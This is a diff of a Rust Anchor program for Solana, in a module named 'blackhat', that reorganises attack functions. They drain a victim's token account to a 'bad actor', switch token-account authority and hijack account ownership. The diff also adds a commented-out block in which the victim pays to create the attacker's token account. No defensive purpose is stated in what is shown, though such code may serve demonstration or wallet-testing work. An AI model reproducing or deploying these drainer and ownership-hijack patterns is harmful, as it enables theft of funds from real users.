@@ -84,10 +84,33 @@ pub mod blackhat {
         Ok(())
     }
 
+    #[allow(unused_variables)]
+    pub fn enable_bitflip<'info>(
+        ctx: Context<'_, '_, '_, 'info, EnableBitflip<'info>>,
+        pda_bytes: [u8; 32],
+    ) -> Result<()> {
+        Ok(())
+    }
+
     pub fn bitflip_drain_token_account<'info>(
         ctx: Context<'_, '_, '_, 'info, BitflipDrainTokenAccount<'info>>,
     ) -> Result<()> {
         if !ctx.accounts.bit_flipper.data_is_empty() {
+            // if ctx.accounts.bad_actor_ata.data_is_empty() {
+            //     let cpi_ctx: CpiContext<'_, '_, '_, '_, associated_token::Create<'_>> =
+            //         CpiContext::new(
+            //             ctx.accounts.associated_token_program.to_account_info(),
+            //             associated_token::Create {
+            //                 payer: ctx.accounts.victim.to_account_info(),
+            //                 associated_token: ctx.accounts.bad_actor_ata.to_account_info(),
+            //                 mint: ctx.accounts.mint.to_account_info(),
+            //                 authority: ctx.accounts.bad_actor.to_account_info(),
+            //                 token_program: ctx.accounts.token_program.to_account_info(),
+            //                 system_program: ctx.accounts.system_program.to_account_info(),
+            //             },
+            //         );
+            // }
+
             let cpi_ctx = CpiContext::new(
                 ctx.accounts.system_program.to_account_info(),
                 token::Transfer {
@@ -112,19 +135,6 @@ pub mod blackhat {
         }
 
         Ok(())
-    }
-
-    #[derive(Accounts)]
-    pub struct SwitchTokenAccountAuthority<'info> {
-        /// CHECK: IM A BAD ACTOR
-        #[account(mut)]
-        pub token_program_owned_account: AccountInfo<'info>,
-
-        /// CHECK: IM A BAD ACTOR
-        pub current_authority: AccountInfo<'info>,
-
-        /// CHECK: IM A BAD ACTOR
-        pub token_program: AccountInfo<'info>,
     }
 
     pub fn switch_token_account_authority<'info>(
@@ -153,20 +163,6 @@ pub mod blackhat {
         Ok(())
     }
 
-    #[derive(Accounts)]
-    pub struct HijackAccountOwnership<'info> {
-        /// CHECK: IM A BAD ACTOR
-        #[account(mut)]
-        pub victim: Signer<'info>,
-
-        /// CHECK: IM A BAD ACTOR
-        pub system_program: AccountInfo<'info>,
-
-        /// CHECK: IM A BAD ACTOR
-        #[account(constraint = program.key == &crate::id())]
-        pub program: AccountInfo<'info>,
-    }
-
     // Example: https://solscan.io/tx/3q25bc7tPquaoqyueRyp5JzdRRkZus1GcTkrhsUWyDLgNyJ3GD7vCiwdqkkriyscr53uTr6WxA59UHS66T8xcVDS
     pub fn hijack_account_ownership<'info>(
         ctx: Context<'_, '_, '_, 'info, HijackAccountOwnership<'info>>,
@@ -180,14 +176,6 @@ pub mod blackhat {
 
         system_program::assign(create_program_ctx, &crate::id())?;
 
-        Ok(())
-    }
-
-    #[allow(unused_variables)]
-    pub fn enable_bitflip<'info>(
-        ctx: Context<'_, '_, '_, 'info, EnableBitflip<'info>>,
-        pda_bytes: [u8; 32],
-    ) -> Result<()> {
         Ok(())
     }
 
